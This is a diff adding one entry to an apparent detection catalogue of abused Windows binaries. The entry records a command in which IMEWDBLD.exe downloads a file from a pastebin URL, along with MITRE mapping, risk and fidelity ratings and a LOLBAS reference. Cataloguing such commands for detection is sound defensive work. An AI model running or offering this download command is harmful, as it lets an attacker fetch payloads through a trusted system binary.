@@ -1,0 +1,19 @@
+- command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
+  description: Abuse imewdbld.exe to download a file via the Internet - the file will be stored at '%localappdata%\Microsoft\Windows\inetcache\*chars*/filename'.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
+  risk: High
+  risk_reason: Use of this tool with an external URL is a large red flag for threat activity.
+  fidelity: High
+  fidelity_reason: This tool is typically very rarely seen in enterprise environments contacting external URLs.
+  tool: imewdbld
+  threatactors:
+    N/A:
+      - N/A
